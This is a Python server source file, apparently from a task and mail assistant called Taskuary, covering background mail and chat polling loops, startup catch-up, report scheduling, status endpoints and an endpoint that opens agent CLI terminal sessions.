    out = _refresh_chat_context(item.get('tid'), item.get('mid'), grace=True, on_fetched=on_fetched)
    # the poll may have landed lines; only then is a second build worth its cost
    fresh = (funnel.next_item(store, key) or funnel.item_for_key(store, key) or item) if out.get('newer') or out.get('added') else item
    after = _latest_context_message(fresh.get('tid'), fresh.get('mid'))
    # `stale` catches a background sync that landed before this request; seen_mid catches the
    # narrower race where it landed after the browser's last five-second pile refresh.
    out['newer'] = bool(out.get('newer') or
                        (seen_mid and after and after.get('MessageId') != seen_mid) or
                        (seen_mid is None and fresh.get('stale')))
    out['item'] = fresh
    out['after'] = after or out.get('after')
    return out


def _context_update_line(freshness: dict) -> str:
    m, item = freshness.get('after') or {}, freshness.get('item') or {}
    who = m.get('FromName') or m.get('FromEmail') or 'Someone'
    ref = item.get('ref') or item.get('title') or 'this thread'
    body = ' '.join(str(m.get('BodyText') or '').split())[:180]
    tail = f': “{body}”' if body else ''
    rv = store.get_review(item['rid']) if item.get('rid') else None
    # the owner answered outside Taskuary (PW-053): the draft was retired by the sync, so say that - not
    # 'redraft it' - and leave any newer ask to triage, which already read it
    if rv and rv.get('Status') == 'superseded':
        return (f'You already answered {ref} outside Taskuary, so the pending draft was retired - nothing to send. '
                'Anything asked since went through triage.')
    draft = ' The earlier draft is now out of date; redraft it before sending.' if rv and rv.get('Status') == 'pending' else ''
    return f'New message from {who} arrived on {ref}{tail}. I sent it through triage before continuing.{draft}'


def poll_forever():
    """The ten-minute sync the Timeline has always PROMISED - made by the server, at last.

    It used to be the BROWSER'S: a setInterval living inside the Timeline tab. So it stopped
    the moment you opened Board or Tasks, because that tab unmounts; it restarted its ten-minute
    countdown every time a filter changed the effect's dependencies; and with no window open
    nothing polled at all - which also meant a report scheduled for 8am Monday only ran if
    somebody happened to have the Timeline on screen at 8am on Monday. The mailbox does not care
    which tab is open, so the clock does not live there any more.

    This is the FULL lane's clock only. The chat clock is quick_forever, on its own thread: while
    this loop sits inside a long sync, a branch here could never fire."""
    _walk_settled()
    while True:
        try:
            # the heartbeat sits OUTSIDE the sync switch on purpose: poll_minutes 0 means
            # "do not go and look", not "the app is closed", and a check that reads arrivals
            # rather than the scheduler has to be able to tell those two apart (TQ-0451)
            if time.time() - _HEARTBEAT[0] >= HEARTBEAT_TICK:
                _HEARTBEAT[0] = time.time(); note_app_up(store)
            try: mins = int(store.get_setting('poll_minutes') or 0)
            except (TypeError, ValueError): mins = 10
            if mins > 0 and time.time() - _LAST_POLL[0] >= mins * 60:
                _poll_reports(0, what='syncing')
        except Exception as e:
            logger.warning(f'scheduled poll failed: {e}')      # a bad cycle must not end the loop
        time.sleep(POLL_TICK)


DOORWAY_TICK = 1.0              # the assistant chat is a conversation, not a mailbox - see doorway_forever


# the share-only port (sharing.py), opened at start when links are on - named, so the tests' lifespan guard can stop it like the loops
def share_start():
    from . import sharing
    sharing.sync_listener(store)


def doorway_forever():
    """THE DOORWAY IS NOT ON THE MAIL CLOCK. A message the owner types to the assistant in WhatsApp or
    Telegram waited for that connector's 30-second tick before anything even read it, so a two-step
    walk cost a minute of silence (the owner, 2026-09-15: "30 [seconds] is for incoming. talking to
    whatsapp through assistant should be instant").

    Only connectors that carry an Assistant chat are read here (remote_assistant.polls), and the read
    is the SAME one the chat clock does - the per-type lock in _poll_quick means whichever gets there
    first wins and the other tick is a no-op, and remote_assistant._claim makes a message answered by
    both readers answer once. Nothing else about the poll changes: no reports, no CI."""
    _walk_settled()                 # the phone IS the walk: it must not answer from yesterday's
    while True:
        try:
            from . import remote_assistant
            types = []
            for c in store.list_connectors():
                if c.get('Active') and c.get('Type') not in types and remote_assistant.polls(store, c):
                    types.append(c['Type'])
            if types: _poll_on_quick_clock(types, timer=False, quiet=True)     # every tick, whatever the chat clock says
        except Exception as e:
            logger.debug(f'doorway poll failed: {e}')
        time.sleep(DOORWAY_TICK)


def quick_forever():
    """The chat clock. poll_minutes 0 is "background sync off", and that includes this clock.

    It also carries the by-the-way push: while the walk is in a phone chat, an interruption has to
    go THERE, and an agent raising its hand is not something a mailbox poll would ever discover.
    That is why it sits outside the sync switch and throttles itself (remote_assistant.push_alerts).
    The WhatsApp launch grace is the poll's own now (messengers.poll_whatsapp -> wabridge.ready)."""
    _walk_settled()                 # an alert put down in the old chat may speak once more - after the new chat exists
    while True:
        try:
            from . import remote_assistant, welcome
            welcome.flush(store, wait=False)              # a press kept while the store was busy (welcome.pressed)
            try: remote_assistant.push_alerts(store)
            except Exception as e: logger.warning(f'could not send an interruption to the chat: {e}')
            try: mins = int(store.get_setting('poll_minutes') or 0)
            except (TypeError, ValueError): mins = 10
            if mins > 0:
                quick = _quick_due()
                if quick: _poll_on_quick_clock(quick)
        except Exception as e:
            logger.exception(f'chat poll failed: {e}')
        time.sleep(QUICK_TICK)


# A chat channel on the ten-minute mailbox clock is a slow conversation. Chat connectors default
# to the 30-second clock; poll_seconds can make one slower (or explicitly zero to leave it only on
# the global clock). The quick pass polls ONLY those connectors and runs no reports or CI.
_QUICK_LAST = {}
_QUICK_LAST_STORE = {}
_QUICK_TIMER = threading.local()


def _recently_fetched(types, target_store=None) -> bool:
    """Whether every requested provider completed a fetch within the context grace period."""
    now = time.time()
    providers = [str(provider).lower() for provider in types]
    return bool(providers) and all(
        now - _QUICK_LAST.get(provider, 0) <= CONTEXT_FRESH_SECONDS
        and (target_store is None or _QUICK_LAST_STORE.get(provider) == id(target_store))
        for provider in providers)


def _poll_on_quick_clock(types, timer: bool = True, quiet: bool = False):
    """Each due chat type on its own thread, marked for the due recheck. One shared chat lane meant a
    bridge that hung for forty seconds skipped every Teams, Slack and Telegram tick in between; now a
    slow type holds only its own lock (_poll_quick) and this tick waits for it no longer than the clock.

    `timer=False` is the doorway's read: it is NOT subject to the chat clock's cadence. Marked as a
    timer read, the doorway's one-second tick was filtered by _quick_due and actually read the
    assistant chat once per poll_seconds - thirty seconds - so "next" typed on the phone sat unheard
    for up to half a minute while the reply itself takes half a second (measured 2026-09-20).

    `quiet=True` is the doorway too: a read that finds nothing leaves the banner alone (_poll_quick).
    With one type there is no other type to keep on time, so it is read on the doorway's own thread
    rather than on a fresh thread every second; the type lock still makes a hung read skip, not stack."""
    def one(typ):
        _QUICK_TIMER.active, _QUICK_TIMER.quiet = timer, quiet
        try: _poll_reports(0, what='syncing', only=[typ])
        except Exception as e: logger.exception(f'chat poll failed ({typ}): {e}')   # with the traceback: 'unhashable type: dict' twice, and no line to go to
        finally: _QUICK_TIMER.active = _QUICK_TIMER.quiet = False
    types = list(dict.fromkeys(types))
    if quiet and len(types) == 1: return one(types[0])
    threads = [threading.Thread(target=one, args=(t,), name=f'quick-{t}', daemon=True) for t in types]
    for th in threads: th.start()
    deadline = time.monotonic() + QUICK_TICK
    for th in threads: th.join(max(0.0, deadline - time.monotonic()))

def _quick_due() -> list:
    due = []
    for c in store.list_connectors():
        if not c['Active']: continue
        try:
            cfg = json.loads(c.get('ConfigJson') or '{}')
            raw = cfg.get('poll_seconds') if isinstance(cfg, dict) else 0
            # blank is "the default", as the card says - a cleared field saved as '' is not an explicit 0
            if raw is None or str(raw).strip() == '': raw = CHAT_POLL_SECONDS if c.get('Type') in CHAT_CONNECTORS else 0
            secs = int(str(raw).strip())
        except (TypeError, ValueError): secs = 0
        if secs > 0 and time.time() - _QUICK_LAST.get(c['Type'], 0) >= secs:
            due.append(c['Type'])
    return due

def _poll_reports(backfill_hours: float = 0, what: str = 'syncing',
                  only=None, wait: bool = False, on_fetched=None):
    """The full lane; `only` hands the call to the chat lane (_poll_quick) instead."""
    if only is not None:
        return _poll_quick(only, what, wait, timer=bool(getattr(_QUICK_TIMER, 'active', False)), on_fetched=on_fetched,
                           quiet=bool(getattr(_QUICK_TIMER, 'quiet', False)))
    target_store = store                 # a test or shutdown cannot retarget work already started
    # one full poll at a time, enforced by a lock instead of the old 10-minute timestamp guard: a
    # slow catch-up (CLI triage over a 3-day backfill) legitimately outlives 10 minutes, so
    # the timeline's auto-sync kept starting SECOND polls over the same watermarks - each one
    # rewriting 'running', and the "catching up" banner never ended.
    acquired = _POLL_BUSY.acquire(timeout=DRAIN_WAIT) if wait else _POLL_BUSY.acquire(blocking=False)
    if not acquired:
        logger.info('poll already running - skipped'); return False
    _LAST_POLL[0] = time.time()  # a manual Sync now resets the clock too, so the timer
                                 # does not fire again moments later over the same watermarks
    status = _status_begin(target_store, 'full', what)
    # WHERE A PASS SPENDS ITS TIME, in one line at the end. The startup catch-up sat behind the
    # "catching up" banner for minutes with nothing in the log between its phases, so "startup took
    # almost 10 minutes" (the owner, 2026-09-18) could not be answered: reading the mailboxes, judging
    # the arrivals, or running the reports? Each phase stamps here; the line at the end says which.
    t0, spent = time.monotonic(), {}
    def _lap(name):
        nonlocal t0
        now = time.monotonic(); spent[name] = spent.get(name, 0.0) + now - t0; t0 = now
    try:
        # the morning's Remind me dates and the due days, each filed as a note on its task so it is back on the rail -
        # BEFORE the catch-up: behind minutes of mail, a reminder came late on exactly the mornings it mattered (remind.tick)
        try:
            from . import remind
            remind.tick(target_store)
        except Exception as e:
            logger.warning(f'reminders failed: {e}')
        # channels FIRST: the Morning digest is a report over Taskuary's own data, and run
        # before the catch-up it would summarize yesterday while today sat in the mailbox
        from .channels import poll_channels, _poll_jobs
        # the ORIGINAL what is kept and appended to: "catching up on the last 3 day(s)" is
        # the context, "reading outlook · 12 in so far" is the progress, and replacing the
        # first with the second loses why the poll is running at all
        def _say(kind, so_far): _status_progress(target_store, status, f'{what} · reading {kind}' + (f' · {so_far} in so far' if so_far else ''))
        # show first, judge next: the poll stores every message as it reads it (the timeline
        # shows them at once, wearing 'triaging'), and the AI calls come afterwards, in order
        from . import ingest as ingest_mod
        # a type the chat lane is reading this very second is left to it (one lane per type)
        mine = list(dict.fromkeys(c['Type'] for c, _ in _poll_jobs(target_store)))
        with _claim_fetch(mine, 'full') as types:
            try:
                with ingest_mod.deferred():
                    added = poll_channels(target_store, backfill_hours, progress=_say, only=types) if types else 0
                # "checked" means every source was read: a type the chat lane held this cycle was not,
                # so the stamp waits for a cycle that read them all. Connector errors stay intact.
                if types and set(types) == set(mine):
                    target_store.set_setting('ingest_last_fetch_completed_at', str(time.time()), 'system')
            finally:
                # A full pass IS a chat attempt (PW-002). Stamp before releasing its connector
                # claims, so the quick clock cannot enter the release-to-stamp gap and duplicate it.
                now = time.time()
                for t in types:
                    if t in CHAT_CONNECTORS:
                        _QUICK_LAST[t] = now
                        _QUICK_LAST_STORE[t] = id(target_store)
        _lap('reading')
        def _left(n): _status_progress(target_store, status, f'{what} · processing messages' + (f' · {n} left' if n else ''), phase='triaging')
        # Drain progress runs after a judgement finishes. Publish the phase before
        # submitting so even the first slow judgement cannot still say "reading".
        _left(0)
        try:
            ticket = _drain_worker(target_store).submit(progress=_left)
            ticket.wait()                   # full sync/reports retain their established sequencing
            if ticket.error: logger.warning(f'deferred triage drain failed: {ticket.error}')
        except Exception as e:
            logger.warning(f'deferred triage drain failed: {e}')
        # ...and the rows an EARLIER sync could not judge, now that this one has a brain to ask.
        # After the drain, so today's arrivals are judged first and a still-dead endpoint is
        # discovered on them rather than on the backlog (ingest.retry_failed_triage).
        try:
            retried = ingest_mod.retry_failed_triage(target_store, _llm(target_store))
            if retried: _status_progress(target_store, status, f'{what} · {retried} retried', phase='triaging')
        except Exception as e:
            logger.warning(f'retrying stranded triage failures failed: {e}')
        _lap('judging')
        # the git loop: a task's PR is watched here, and a red build goes back to the agent
        # that wrote the code (ci.py) - off unless the owner turned ci_watch on
        _status_progress(target_store, status, what, phase='checking')
        try:
            from . import ci
            ci.poll(target_store)
        except Exception as e:
            logger.warning(f'CI poll failed: {e}')
        try:                                            # ...and an outside pull request being fixed in GitHub's cloud (cloudfix.py)
            from . import cloudfix
            cloudfix.poll(target_store)
        except Exception as e:
            logger.warning(f'cloud fix poll failed: {e}')
        # the agent wall composts once a day: yesterday's notes become one summary per checkout,
        # so what an agent reads tomorrow is what still matters (blackboard.roll_up)
        try:
            blackboard.roll_daily(target_store)
        except Exception as e:
            logger.warning(f'the wall roll-up failed: {e}')
        try:                                            # ...and archived chats past their keep-days go, once a day (retention.py)
            from . import retention
            retention.tick(target_store)
        except Exception as e:
            logger.warning(f'chat retention skipped: {e}')
        try:                                            # the bridge's log is on the same daily clock
            from . import wabridge
            wabridge.trim_log(target_store)
        except Exception as e:
            logger.warning(f'whatsapp log trim skipped: {e}')
        try:                                            # the outcome ledger: resolve what is old enough to judge, once a day (outcomes.py)
            from . import outcomes
            outcomes.sweep_if_due(target_store)
        except Exception as e:
            logger.warning(f'outcome sweep skipped: {e}')
        try:                                            # ...and nothing fell through: the aged ask, the open task in no state (sweep.py)
            from . import sweep
            sweep.run_if_due(target_store)
        except Exception as e:
            logger.warning(f'loose-end check skipped: {e}')
        try:                                            # ...and the owner's manager and reports from Microsoft's directory, once a day (orgchart.py)
            from . import orgchart
            orgchart.sync_if_due(target_store)
        except Exception as e:
            logger.warning(f'org chart read skipped: {e}')
        try: playbooks.purge()                          # ...and a playbook deleted KEEP_DAYS ago leaves Recently deleted (playbooks.py)
        except Exception as e: logger.warning(f'deleted playbooks not purged: {e}')
        try:                                            # ...and what Recently deleted has kept its time goes for good (recentlydeleted.py)
            from . import recentlydeleted; recentlydeleted.purge(target_store)
        except Exception as e: logger.warning(f'Recently deleted not purged: {e}')
        _lap('housekeeping')
        return added
    finally:
        try:
            if spent:
                total = sum(spent.values())
                logger.info(f"full pass ({what}) took {total:.0f}s: " + ' · '.join(f'{k} {v:.0f}s' for k, v in spent.items()))
        finally:
            try: _status_end(target_store, status)
            finally: _POLL_BUSY.release()


def _poll_quick(only, what: str = 'syncing', wait: bool = False, timer: bool = False, on_fetched=None, quiet: bool = False):
    """The chat lane: read ONLY these connector types, put their lines first on the one ordered
    drain worker, and release the fetch clock - no CI, no reports.

    Returns what it added, or False when nothing was read: the lane was busy, every type was in
    the full lane's hands, or the fetch failed - and with wait=True (the context gate before an
    answer about a chat) also waits until its lines' complete routes finish within DRAIN_WAIT. The fast
    clock is stamped when an ATTEMPT ENDS, success or failure: a broken connector retries one
    interval later, while an attempt that never ran is not stamped and is due again next tick.
    A full lane owns the visible banner while both are active; either lane remains truthful when
    the other finishes first."""
    target_store = store                 # every asynchronous drain keeps this exact store
    deadline = time.monotonic() + DRAIN_WAIT if wait else None
    held = [t for t in dict.fromkeys(only)
            if (_quick_lock(t).acquire(timeout=DRAIN_WAIT) if wait else _quick_lock(t).acquire(blocking=False))]
    if not held:
        # named, and only when the wait is long enough to be the reason a chat answer is late: the
        # live log had 161 anonymous "skipped" lines and nothing to say which lane or how long
        logger.info(f"chat poll already running - skipped {', '.join(dict.fromkeys(only))}"); return False
    only = held                          # a type another tick still holds is left to it; it is due again next tick
    ticket, added, fresh_channels = None, False, []
    try:
        remaining = max(0, deadline - time.monotonic()) if wait else None
        with _claim_fetch(list(dict.fromkeys(only)), 'quick', wait=wait, timeout=remaining) as types:
            # The timer computed its due list before admission. A full fetch may have completed
            # and stamped one of these connectors meanwhile; recheck while our claim closes that
            # stale-decision race. Explicit context refreshes intentionally bypass the cadence.
            if timer:
                still_due = set(_quick_due())
                types = [typ for typ in types if typ in still_due]
            if types:
                # QUIET is the doorway's once-a-second read: shown as "syncing" it flickered the caption
                # every second and pushed three status writes a second at every open page while nothing
                # came in (P13). It shows only when it brought something; a failure still logs below.
                status = None if quiet else _status_begin(target_store, 'quick', what)
                try:
                    from .channels import CH2SRC, poll_channels
                    from . import ingest as ingest_mod
                    fresh_channels = list(dict.fromkeys(CH2SRC[t] for t in types if t in CH2SRC))
                    def _say(kind, so_far):
                        _status_progress(target_store, status, f'{what} · reading {kind}' + (f' · {so_far} in so far' if so_far else ''))
                    t_read = time.monotonic()
                    with ingest_mod.deferred():
                        added = poll_channels(target_store, 0, progress=None if quiet else _say, only=types)
                    if quiet and added: status = _status_begin(target_store, 'quick', f"{what} · reading {', '.join(types)}")
                    # a slow read is the whole latency of a phone turn: the doorway cannot hand the
                    # owner's line to the assistant until this returns (the owner, 2026-09-20:
                    # "hitting next or 3 in whatsapp takes a while")
                    if said := chat_read_line(types, added, time.monotonic() - t_read): logger.info(said)
                    # new lines are announced the moment they LAND (PW-052): the caller says retriage started,
                    # then waits below for the result - the owner is never shown the result as the first word
                    if on_fetched and added:
                        try: on_fetched(int(added))
                        except Exception as e: logger.warning(f'retriage notice failed: {e}')
                    ticket = _drain_worker(target_store).submit(fresh=fresh_channels, only_fresh=True)
                except Exception as e:
                    logger.exception(f"chat poll failed ({', '.join(types)}): {e}")
                finally:
                    now = time.time()
                    for t in types:
                        _QUICK_LAST[t] = now
                        _QUICK_LAST_STORE[t] = id(target_store)
                    if status is not None: _status_end(target_store, status)
    finally:
        for t in held: _quick_lock(t).release()
    # Waiting belongs to the explicit action's correctness gate, not the connector fetch lane.
    # Background ticks can claim and fetch this connector while its earlier rows are triaged.
    if ticket is None: return False
    if wait:
        remaining = max(0, deadline - time.monotonic())
        if not ticket.wait(remaining) or ticket.error: return False
        remaining = max(0, deadline - time.monotonic())
        if not ingest_mod.await_quiet(target_store, fresh_channels, timeout=remaining): return False
    return added


def _catchup_hours(ceiling_days: int) -> float:
    """How far past the watermark startup actually needs to reach: the time the app was CLOSED,
    not the full `startup_sync_days` ceiling. Reopening ten minutes after closing used to re-read
    three days of every mailbox (dedupe threw it all away, slowly - the whole timeline sat behind
    a 'catching up' banner for it). Under an hour of gap is what the watermark already covers.

    Hours, not days. Rounding the gap UP to a whole day and then measuring it from `now` reached
    back behind the watermark by the rounding: closed 8.75h, it asked Graph for 24h and pulled 272
    messages the database already had to keep 93 (the owner's mailbox, 2026-09-17). The gap plus
    channels.STARTUP_OVERLAP is the whole question - the ceiling only ever caps it."""
    last = max((str(s.get('LastPolledAt') or '') for s in store.list_sources()), default='')
    ceiling = ceiling_days * 24
    if not last: return ceiling
    try: gap_h = (datetime.now() - datetime.fromisoformat(last.replace(' ', 'T'))).total_seconds() / 3600
    except ValueError: return ceiling
    from .channels import STARTUP_OVERLAP
    return 0 if gap_h <= 1 else min(ceiling, gap_h + STARTUP_OVERLAP.total_seconds() / 3600)


REPORT_TICK = 60                # seconds between looks at which reports are due - is_due does the rest
_REPORTS_BUSY = threading.Lock()


def report_pass(startup: bool = False) -> int | None:
    """Every report that is due, then the phone's morning line. On the reports' OWN clock: they ran
    inside the mail poll, so turning the mail poll off stopped every report and turning startup catch-up
    off stopped every "on app start" one (the owner, 2026-09-27). A startup pass WAITS for a running
    pass rather than being dropped - it is the only one that runs the "on app start" reports."""
    # the demo is a made-up world with its report rows already in it: nothing there runs on a clock, and an
    # Advisor posting into it mid-session moved the rows a visitor (and the browser tests) were reading
    if demo.enabled() or not _REPORTS_BUSY.acquire(blocking=startup): return None
    try:
        n = run_due_reports(store, startup)
        try:
            from . import remote_assistant
            remote_assistant.morning_line(store)
        except Exception as e: logger.warning(f'the morning line was skipped: {e}')
        return n
    finally: _REPORTS_BUSY.release()


def reports_forever():
    """The reports' clock. The first pass is the startup one (catch_up_on_startup runs it behind the
    mail), so this waits a tick before its first look."""
    while True:
        time.sleep(REPORT_TICK)
        try: report_pass()
        except Exception as e: logger.warning(f'scheduled report pass failed: {e}')   # a bad pass must not end the loop


@app.post('/api/reports/due')
def reports_due(background: BackgroundTasks):
    """The Reports tab's "Run due now": the reports that are owed, and nothing else - not a mail sync."""
    if _REPORTS_BUSY.locked(): return {'report': 'busy'}
    background.add_task(report_pass)
    return {'report': 'running'}


def _heal_ended():
    """A task whose PR or issue already ended, held open by the old close-out rule. Run on the catch-up's thread, never
    in the lifespan: closing a task can write its wrap-up with the AI, and eight of them held the first page back a
    minute (the owner, 2026-09-28)."""
    try:
        from .channels import heal_upstream_ended
        heal_upstream_ended(store)
    except Exception as e: logger.warning(f'ended-item heal skipped: {e}')


def catch_up_on_startup():
    """Whatever arrived while the app was closed was polled by nobody, and Taskuary is not a
    service - it is a window you open. So opening it reaches back past the watermark - but only
    as far as the app was actually closed, with `startup_sync_days` (default 3) as the ceiling.
    0 turns the startup MAIL poll off; the reports owed at app start still run."""
    try: days = int(store.get_setting('startup_sync_days') or 0)
    except ValueError: days = 0
    if days <= 0:
        t = threading.Thread(target=lambda: (_walk_settled(), _heal_ended(), report_pass(startup=True)), daemon=True)
        t.start()
        return t
    hours = _catchup_hours(days)
    logger.info(f"startup: {'incremental poll (closed under an hour)' if hours == 0 else f'catching up on the {hours:.1f} hour(s) it was closed'}")
    from . import welcome
    # the greeting waits for the mail: said mid catch-up it was "nothing new came in" on a Monday, spent and never corrected (B4)
    welcome.catch_up_began()
    def _catch_up():
        # Behind the new walk, on purpose - and no longer behind the WhatsApp grace, which kept the mail behind the reset
        # only by accident: it waited 8 s before the first mail on every launch, WhatsApp on or off (P11). Only the
        # WhatsApp poll waits now, and only for a bridge this launch started (messengers.poll_whatsapp -> wabridge.ready).
        _walk_settled()
        _heal_ended()
        # EVERYTHING IN FIRST. A report is not the mail, and running the due ones inside this
        # pass charged their minutes to the catch-up: 27 hours of mail was 91 s of a 264 s
        # startup and six reports were the other 165 s, all of it behind one 'catching up on
        # the 27 hour(s)' banner (measured on the owner's box, 2026-09-19). So the catch-up
        # ENDS when the mail is in and judged...
        try: _poll_reports(hours, what=f'catching up on {hours:.0f}h closed' if hours else 'syncing')   # fits the sidebar's one sync line
        finally: welcome.catch_up_ended()      # the held greeting is said now, with the mail in
        # ...and the reports that were due take their own pass, on their own lock
        try: report_pass(startup=True)
        finally: welcome.startup_reports_done()      # the opening card stops saying the digest is being written
        # the Morning digest needs no call of its own anymore: it is a seeded REPORT, run by
        # the pass above like every other one. Consolidate what the verdicts taught next,
        # on the same once-a-day rhythm.
        try: learn.reflect_if_due(store)
        except Exception as e: logger.warning(f'reflection failed: {e}')
    t = threading.Thread(target=_catch_up, daemon=True)
    t.start()
    return t                       # the caller may wait on it; startup itself never does


def _heal_owner_docs():
    """The shipped docs read as a person on purpose - John Smith is the open-source example, not
    a token soup - and they stay that way until a REAL owner is known. The moment one is (the
    owner card, or a name typed into SOUL.md), the docs convert themselves once per launch: the
    placeholder and the known name both sweep into {{owner}} tokens, so every mention follows
    the one setting from then on. "Johnson Controls" is not a name match; owner prose survives."""
    try:
        soul = store.get_doc('soul') or ''
        if not (store.get_setting('owner_name') or '').strip():
            name = store_mod.owner_from_soul(soul)
            if name and name not in ('the owner', 'John Smith'):   # John Smith IS the placeholder
                store.set_setting('owner_name', name, 'startup')
                em = store_mod.email_from_soul(soul)
                if em and em != 'john.smith@example.com': store.set_setting('owner_email', em, 'startup')
        who = store.owner()
        if who['owner'] in ('the owner', '', 'John Smith') or '{{' in who['owner']:
            return                                    # nobody real named yet: the example stands
        for doc in ('soul', 'job', 'coding', 'digest', 'learned', 'triage', 'style', 'counsel'):
            raw = store.get_doc(doc)
            if not raw: continue
            t = store_mod.retoken_doc(raw, 'John Smith', 'john.smith@example.com')
            t = store_mod.retoken_doc(t, who['owner'], who['owner_email'])
            if t != raw:
                # tokenizing a name is not editing the document: a doc nobody has touched stays
                # 'template' so shipped improvements keep reaching it (store seeds it afresh each
                # launch and this pass tokenizes it again - idempotent, and current)
                store.save_doc(doc, t, 'template' if store.doc_owner(doc) == 'template' else 'startup')
                logger.info(f'{doc}.md: owner names converted to tokens (owner: {who["owner"]})')
    except Exception as e:
        logger.warning(f'owner-doc heal failed: {e}')


def _refresh_soul_connections():
    """The connections block in SOUL.md is GENERATED text, so a fix to its wording has to reach
    installs that never touch a connector again - refresh it once per launch. The owner's own
    prose outside the markers is untouched, as always."""
    from .docsync import sync_connections, sync_projects
    from .projects import backfill
    try:
        sync_connections(store, 'startup')
        backfill(store)
        sync_projects(store, 'startup')
    except Exception as e: logger.warning(f'connection sync at startup failed: {e}')

@app.post('/api/ingest/poll')
def ingest_poll(background: BackgroundTasks):
    if _POLL_BUSY.locked(): return {'report': 'busy'}      # a pass is running; a second would be skipped anyway
    background.add_task(_poll_reports)
    return {'report': 'running'}

def _thinking_line() -> str:
    from . import problems
    try: t = problems.thinking(store)
    except Exception: return ''
    return f"{t['title']}. {t['detail']}" if t else ''

@app.get('/api/ingest/status')
def ingest_status():
    try: st = json.loads(store.get_setting('ingest_status') or '{"state": "idle"}')
    except ValueError: st = {'state': 'idle'}
    # a poll that died with the app leaves 'running' behind with nobody holding the lock - a
    # ghost the timeline banner would show forever (the poll sets the flag only AFTER taking
    # the lock, so running-but-unlocked is always a ghost). Heal it on read.
    if st.get('state') == 'running' and not (_POLL_BUSY.locked() or _quick_busy()):
        st = {'state': 'idle'}
        store.set_setting('ingest_status', json.dumps(st), 'system')
    # the cadence rides along so the timeline's caption can state the truth instead of a
    # hardcoded "every 10 min" that stayed on screen after somebody set the interval to 0
    try: every = int(store.get_setting('poll_minutes') or 0)
    except (TypeError, ValueError): every = 10
    try:
        fetched_at = float(store.get_setting('ingest_last_fetch_completed_at'))
        if not 0 < fetched_at < float('inf'): fetched_at = None
    except (TypeError, ValueError): fetched_at = None
    # and the clock itself: when the last full poll ran and when the next is due, so the caption
    # can count down instead of asserting a cadence nobody could check
    return {'status': st, 'everyMinutes': every, 'lastPollAt': _LAST_POLL[0],
            'lastFetchCompletedAt': fetched_at,
            # a source whose last read failed, so "checked 7:09" never covers for it (its card has the why)
            'failed': sorted({c['Type'] for c in store.list_connectors() if c.get('Active') and c.get('LastError')}),
            'nextPollAt': (_LAST_POLL[0] + every * 60) if every > 0 else None, 'now': time.time(),
            # the brain's last failure, until it answers again - shown in the caption, not buried in rows
            'triageError': store.get_setting('triage_last_error') or '',
            # ...and the same thing in the assistant's voice, while held mail keeps it true (problems.thinking)
            'thinking': _thinking_line(),
            'timelineFade': store.get_setting('timeline_fade') or 'normal'}  # how old rows dim (FeedView)

# ── interactive terminals (real pty + websocket; the headless runs live on /api/runs) ──
# And one socket for the rest of the UI: Timeline/Board/Studio subscribe instead of polling.
@app.websocket('/api/events/ws')
async def events_ws(ws: WebSocket):
    """feed-changed, task-changed, run-tail. Same Host/Origin/token questions as the terminal
    socket: a websocket is exempt from the same-origin policy, so a page that learned the token
    used to subscribe from anywhere (audit 2026-09-16)."""
    if not _ws_ok(ws): return await ws.close(code=4401)
    await ws.accept()
    try:
        await live_bus.serve(ws)
    except (WebSocketDisconnect, RuntimeError):
        pass


class TermBody(BaseModel):
    agent: str | None = None; brain: str | None = None; task_id: int | None = None; repo: str | None = None
    cwd: str | None = None; rows: int = 0; cols: int = 0; seed: bool = False   # 0: open it where the owner watches (terminal.opening_geometry)
    model: str | None = None; instruction: str | None = None

@app.get('/api/terminals')
def terminals(details: bool = True):
    return {'data': [t for t in hub_term.listing(details=details)
                     if (store.get_task(t.get('taskId')) or {}).get('SourceRef') != 'assistant:dock']}

@app.get('/api/terminals/{sid}/screen')
def terminal_screen(sid: str, lines: int = 32):
    """Read-only live terminal preview. It never types into or resizes the PTY."""
    out = hub_term.screen(sid, lines)
    if not out: raise HTTPException(404, 'terminal not found')
    return out

@app.post('/api/terminals')
def open_terminal(body: TermBody):
    """Spawn an agent CLI (or a plain shell) under a real pty. seed=true types the task's
    context in as the first line, so the agent starts on it and you keep talking."""
    tk = store.get_task(body.task_id) if body.task_id else None
    # Taskuary picks the checkout, not the agent: with no repo named, match the ask against the
    # SOUL.md repo map (which lives in this database, nowhere the agent can read).
    repo, why = body.repo, None
    if body.agent and tk and not repo and not body.cwd:
        row = store.get_agent(body.agent)
        repo, why = hub_term.guess_repo(store, body.task_id, json.loads((row or {}).get('Config') or '{}'))
    # seeding only makes sense for an agent CLI - a bare shell would just try to RUN the text.
    # This used to build its own thin prompt (title + summary, no message), which is exactly why
    # an agent started here went back to the API for the mail: it had not been given it.
    # It also used to slice the result to a flat 8000 characters - a second, silent cut on top of
    # seed_text's own (seed_text already bounds itself at SEED_CEILING and says so when it cuts).
    # One prompt builder, both doors: terminal.start_on_task (the dispatch door) never had this
    # slice, so raising DOC_CHARS made this door alone start chopping "Do NOT call the Taskuary
    # API" off the end, unmarked (test_start_session_seeds_the_same_full_prompt_as_dispatch,
    # 2026-09-17).
    seed_fn = ((lambda cwd: hub_term.seed_text(store, body.task_id, body.instruction, repo, cwd,
                                                cli=hub_term.cli_named(json.loads((store.get_agent(body.agent) or {}).get('Config') or '{}'))))
               if body.seed and body.agent and tk else None)
    # this is the owner's door (agents dispatch through terminal.start_on_task): a session opened
    # here is one they sit in, so the task is theirs to end - whichever dialog or button it came from
    from . import selfclose as _sc
    if tk: _sc.claim(store, body.task_id, ACTOR)
    try:
        t = hub_term.open_session(store, body.agent, body.task_id, repo, body.cwd, body.rows, body.cols,
                                  ACTOR, body.model, seed_fn=seed_fn, brain=body.brain)
    except (ValueError, RuntimeError, FileNotFoundError) as e:
        # a CLI you configured but never installed is the common one - say which, don't 500
        raise HTTPException(422, str(e))
    # This is the task page's Start session door (dispatch uses terminal.start_on_task). Opening
    # a real session is an explicit restart: the live agent belongs in progress even when this
    # task had already been marked done, waiting or dropped.
    if tk and tk.get('Status') != 'in_progress':
        store.update_task(body.task_id, {'Status': 'in_progress'}, ACTOR)
    if seed_fn:
        store.add_comment(body.task_id, ACTOR, 'human',
                          f'Opened an interactive {t.label} session in {t.cwd}' + (f' - {why}.' if why else '.'))
    return t.info()

class WrapBody(BaseModel):
    task_id: int | None = None; close: bool = True
    # Mark done on a live session writes the report and then closes the task, and the close dismisses every draft -
    # so a reply drafted here would be a model call thrown away, or worse, land after the close on a done task
    no_reply: bool = False
    # THE WRITE-UP RUNS BEHIND THE PRESS (writeup.py, 2026-10-20): the answer comes back once the session is harvested, the job
    # writes it up, and `then_close` closes the task after it through task.complete - Mark done on a live agent, Close agent
    background: bool = False; then_close: bool = False

